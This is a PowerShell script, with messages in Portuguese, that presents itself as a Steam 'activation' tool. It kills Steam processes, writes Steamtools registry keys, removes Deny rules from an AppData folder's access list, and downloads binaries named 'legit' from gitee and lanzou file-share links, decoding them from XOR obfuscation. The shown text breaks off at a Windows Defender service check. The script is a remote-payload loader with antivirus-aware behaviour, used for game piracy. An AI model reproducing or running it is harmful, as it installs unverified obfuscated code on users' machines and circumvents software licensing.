Clear-Host
#Requires -RunAsAdministrator
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$ErrorActionPreference = "SilentlyContinue"

$logo = @"
                                                                 ..                                                                                                 
                                                                 ....                                                                                               
                                                                  .....                                                                                             
                                                                   .......         ..                                                                               
                                                                    .........      ....                                                                             
                                                                     ...-.......    .....                                                                           
                                                                      ....  ...............                                                                         
                                                                        ....   ..............                                                                       
                                                                 ....... .....     ...... .....                                                                     
                                                                  ..............      ...   .....                                                                   
                                                                   ..... .........           ......                                                                 
                                                             ............        ..            -......                                                              
                                                         ...................                      .......                                                           
                                                     .........           .....                 .     ......                                                         
                                                  .......                   ....-               ...    .....                                                        
                                               .......                                           ....    ...                                                        
                                              ............                                        -....  ....                                                       
                                                   ......                     ...                         ....                                                      
                                                 ......                       ..                            .....                                                   
                                               ......                        ...           ..                 ........                                              
                                              .....                          ....            .......            .  ...                                              
                                            .....                        .........            ...........-      .. ...                                              
                                           ....                       ........ .........        ....  ......-      ...                                              
                                         ....                      .........        ........     ....     ...      ...                                              
                                        ....                     .........                .....    ...    ............                                              
                                       ....                     .........                    ....   ......    .....-                                                
                                      ..........              ..........                       ...    ...... ...                                                    
                                     ..........              ...........                        ..      ....                                                        
                                     ....  ...              ...........                        ...........                                                          
                                          ....             ............                         ......-                                                             
                                          ...             ..............                                                                                            
                                         ....             ...............               ..............                                                              
                                         ....             ............. ..      ...............................-                                                    
                                         ....            .............. ...      -.....            .................                                                
                                         ...             ............... crystalline       ....   .-                ...........                                            
                                         ...             ...............  -.....     ....   -...                   ........                                         
                                          ..              ...............   ............       ....              ............                                       
                                          ...             ................      .......          -...         .................                                     
                                          ...             .................                         ...     ......            .                                     
                                           ..              ...     ..........                ......  ....  .....                                                    
                                            .               ..        .........           ................ ...                                                      
                                            .                ..          -.......        ....-      ..........                                                      
                                                                            .......       ...          ......                                                       
                                                                              ........     ...            ...                                                       
                                                                                .........   ..              .                                                       
                                                                                      ..... ...                                                                     
 ######################                                                                  ......                                                                     
 ########################                                                                   ...                                                                     
 ##########################                                                                  ..                                                                     
      #######    ##########                                                                  ..                                                                     
      #######       ########                       ######                 ######                     ######                       ##                 ######         
      #######        #######  ###### #######   ##############         ############# #######      ###############      ####### ###########        ##############     
      #######        #######  ############## ##################     #######################    ###################    #####################     #################   
      #######        #######  #################################    ########################  ######################   ######################   ###################  
      #######        #######  ########       ######      #######   ########       =========  ########       ########  ########       #######   =======     ######   
      #######        #######  ######               #############  #######          ######## ########         #######  ########        #######  ############         
      #######        #######  ######          ==================  #######           ####### #######           ####### #######         #######   ================    
      #######        #######  ######        ####################  #######           ####### #######           ####### #######         #######     ################  
      #######       ########  ######       ########      #######  #######          ######## ########          ######  #######         #######      #    ########### 
      #######     #########   ######       #######       #######   ########       #########  #######        ########  #######         ####### #######       ####### 
 #########################    ######       #########   ############ #######################  ######################   #######         ####### #########    ######## 
 ########################     ######        #######################  ######################    ###################    #######         #######   ##################  
 #####################        ######          ############ ########    ###########  #######      ###############      #######         #######     ##############    
                                                  ####                              #######           #####                                           ######        
                                                                                    #######                                                                         
                                                                      #####################                                                                         
                                                                      ####################                                                                          
                                                                      ###################                                                                           
                                                                                                                                                                    
                                                                                                                                                                    
                                                                                                                                                                    
                                                           ### ###            ######            ###  ##                                                             
                                                           #####              ###                ## ##                                                              
                                                           ####               ######              ###                                                               
                                                           #####              ###                  #                                                                
                                                           ### ###            ######               #                                                                
                                                                                                                                                                    
                                                                                                                                                                    
                                                                                                                                                                    
                                                                                                                                                                    
"@
Write-Host $logo

function Get-DownloadUrl {
    param (
        [string]$fid,
        [string]$p = $null
    )
    try {
        $baseUrl = 'https://lanzoup.com'
        $response = Invoke-WebRequest -UseBasicParsing -Uri "$baseUrl/$fid" -Headers @{ 'User-Agent' = '' }
    }
    catch {
        $baseUrl = 'https://lanzoui.com'
        $response = Invoke-WebRequest -UseBasicParsing -Uri "$baseUrl/$fid" -Headers @{ 'User-Agent' = '' }
    }
    $content = $response.Content
    $locUrl = [regex]::Match($content, 'window.location.href="(.*?)";').Groups[1].Value
    if ($locUrl) {
        $response = Invoke-WebRequest -UseBasicParsing -Uri $locUrl -Headers @{ 'User-Agent' = '' }
        $content = $response.Content
    }
    $iframeUrl = [regex]::Match($content, 'class="ifr2".+?src="(.*?)"').Groups[1].Value
    if ($iframeUrl) {
        $response = Invoke-WebRequest -UseBasicParsing -Uri "$baseUrl$iframeUrl" -Headers @{ 'User-Agent' = '' } -Method Post
        $content = $response.Content
        $sign = [regex]::Match($content, "var wp_sign = '(.*?)';").Groups[1].Value
    }
    else {
        $sign = [regex]::Match($content, "var skdklds = '(.*?)';").Groups[1].Value
    }
    if (-not$sign) {
        return
    }
    $urlMatch = [regex]::Match($content, "url : '(.*?file=\d{2,})',").Groups[1].Value
    if (-not$urlMatch) {
        return
    }
    $headers = @{
        'User-Agent' = ''
        'Referer'    = $response.BaseResponse.ResponseUri.AbsoluteUri
    }
    $body = @{ 'action' = 'downprocess'; 'sign' = $sign; 'kd' = 1 }
    if ($null -ne $p) {
        $body['p'] = $p
    }
    $response = Invoke-RestMethod -Uri "$baseUrl$urlMatch" -Headers $headers -Method Post -Body $body
    if ($null -eq $response) {
        return
    }
    $dom = $response.dom
    if (-not$dom) {
        return
    }
    $downloadUrl = $response.url
    if (-not$downloadUrl) {
        return
    }
    return "$dom/file/$downloadUrl"
}

function Invoke-WithRetry {
    param(
        [scriptblock]$ScriptBlock,
        [int]$MaxRetries = 10,
        [int]$DelaySeconds = 1
    )
    $retryCount = 0
    while ($retryCount -lt $MaxRetries) {
        try {
            return & $ScriptBlock
        }
        catch {
            $retryCount++
            if ($retryCount -ge $MaxRetries) {
                throw $_
            }
            Start-Sleep -Seconds $DelaySeconds
        }
    }
}

function DownloadFile {
    param(
        [string]$url,
        [string]$savePath,
        [string]$hash,
        [string]$targetPath,
        [string]$fid
    )
    if (-not$targetPath) {
        $targetPath = $savePath
    }
    if ((Test-Path $targetPath) -and ((Get-FileHash -Path $targetPath -Algorithm MD5).Hash -eq $hash)) {
        return
    }
    if (Test-Path $savePath) {
        Remove-Item -Path $savePath -Force -ErrorAction Stop
    }
    Add-Type -TypeDefinition "using System.IO;public class XorUtil{public static void XorFile(string p,byte key){var b=File.ReadAllBytes(p);for(int i=0;i<b.Length;i++)b[i]^=key;File.WriteAllBytes(p,b);}}";
    $urls = @()
    if ($fid) {

        try {
            $urls += (Get-DownloadUrl -fid $fid)
        }
        catch {
        }
    }
    $urls += $url
    $err = $null
    Invoke-WithRetry -ScriptBlock {
        foreach ($url in $urls) {
            try {
                $job = Start-Job -ScriptBlock {
                    param($url, $savePath)
                    Invoke-RestMethod -Uri $url -Headers @{ 'Accept-Language' = 'zh-CN' } -OutFile $savePath -ErrorAction Stop
                } -ArgumentList $url, $savePath
                $job | Wait-Job -Timeout 30 | Out-Null
                if ($job.State -eq "Running") {
                    $job | Stop-Job -PassThru | Remove-Job -Force
                    throw "O download expirou."
                }
                [XorUtil]::XorFile($savePath, 0x42)
                return
            }
            catch {
                $err = $_
            }
        }
        if (-not($null -eq $err)) {
            throw $err
        }
    }
}

function Test-Is64Bit {
    param(
        [Parameter(Mandatory = $true)]
        [ValidateScript({ Test-Path $_ -PathType Leaf })]
        [string]$FilePath
    )

    try {
        $bytes = [System.IO.File]::ReadAllBytes($FilePath)
        if ($bytes.Length -lt 64) { return $false }

        $peOffset = [System.BitConverter]::ToInt32($bytes, 0x3C)
        if ($peOffset -ge $bytes.Length - 2) { return $false }

        if (
            $bytes[$peOffset] -ne 0x50 -or 
            $bytes[$peOffset + 1] -ne 0x45 -or 
            $bytes[$peOffset + 2] -ne 0x00 -or 
            $bytes[$peOffset + 3] -ne 0x00
        ) {
            return $false
        }

        return [System.BitConverter]::ToUInt16($bytes, $peOffset + 4) -in @(0x8664, 0x200, 0xAA64)
    }
    catch {
        return $false
    }
}


try {

    $filePathToDelete = "a.ps1"
    if (Test-Path $filePathToDelete) {
        Remove-Item -Path $filePathToDelete -Force
    }

    Write-Host ""
    Write-Host ""
    Write-Host "  [STEAM] O processo de ativação está em andamento, aguarde..."

    $steamRegPath = 'HKCU:\Software\Valve\Steam'
    $steamPath = (Get-ItemProperty -Path $steamRegPath -Name 'SteamPath').SteamPath
    if ($null -eq $steamPath) {
        Write-Host "  [STEAM] Steam Pode ser que a instalação não tenha sido feita corretamente. Reinstale o Steam e tente novamente." -ForegroundColor Red
        exit
    }
    $exePath = (Get-ItemProperty -Path $steamRegPath -Name 'SteamExe').SteamExe
    $is64Bit = Test-Is64Bit -FilePath $exePath
    $exePid = (Get-ItemProperty -Path ($steamRegPath + "\ActiveProcess") -Name 'pid').pid
    if ($null -ne $exePid) {
        Stop-Process -Id $exePid -ErrorAction SilentlyContinue
    }
    $registryPath = "HKCU:\Software\Valve\Steamtools"
    if (-not(Test-Path $registryPath)) {
        New-Item -Path $registryPath -Force | Out-Null
    }
    Set-ItemProperty -Path $registryPath -Name "packageinfo" -Value "" | Out-Null
    Set-ItemProperty -Path $registryPath -Name "steamclient" -Value "" | Out-Null
    Set-ItemProperty -Path $registryPath -Name "s" -Value "398a2323a3433bfb0aff3d45e27a379200" | Out-Null
    Remove-ItemProperty -Path $registryPath -Name "c" | Out-Null
    if (Test-Path "env:c") {
        Set-ItemProperty -Path $registryPath -Name "c" -Value $env:c -Type DWORD | Out-Null
    }

    $runningProcess = Get-Process | Where-Object { $_.ProcessName -imatch "^steam" -and $_.ProcessName -notmatch "^steam\+\+" }
    $runningProcess | ForEach-Object {
        Stop-Process $_ -Force
    }

    if (-not$( [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544') )) {
        Write-Host "  [STEAM] Execute o comando em modo administrador." -ForegroundColor Red
    }

    $targetDirectory = "$env:APPDATA\Stool"
    if (-not(Test-Path $targetDirectory)) {
        New-Item -Path $targetDirectory -ItemType Directory | Out-Null
    }
    try {
        $acl = Get-Acl $targetDirectory
        $acl.Access | Where-Object { $_.AccessControlType -eq 'Deny' } | ForEach-Object { [void] $acl.RemoveAccessRule($_) }
        Set-Acl $targetDirectory $acl -ErrorAction Stop
    }
    catch {
        Write-Host "  [STEAM] $_" -ForegroundColor Red
    }


    $waitTimes = 10
    while (Get-Process | Where-Object { $_.ProcessName -imatch "^steam" -and $_.ProcessName -notmatch "^steam\+\+" }) {
        Start-Sleep -Seconds 1
        $waitTimes--
        if ($waitTimes -lt 0) {
            break
        }
    }
    
    $ProgressPreference = 'SilentlyContinue'
    if ($is64Bit) {
        $savePathZip = Join-Path $targetDirectory "legit64"
        DownloadFile -url 'https://gitee.com/juuiiii222/aa/raw/master/64/legit64' -savePath $savePathZip -hash 'D8D6CD2061F012E059CAC765287B7441' -fid 'iWgxZ3pgbusj'
    }
    else {
        $savePathZip = Join-Path $targetDirectory "legit"
        DownloadFile -url 'https://gitee.com/juuiiii222/aa/raw/master/legit' -savePath $savePathZip -hash '9B2FF8684E3C886C8FCDF83053D28F35' -fid 'iS21a3gyx7nc'
    }

    $savePathTxt = Join-Path $targetDirectory "winhttp-log.txt"
    $savePathTxt1 = Join-Path $targetDirectory "winhttp-log1.txt"

    if (Get-Service | where-object { $_.name -eq "windefend" -and $_.status
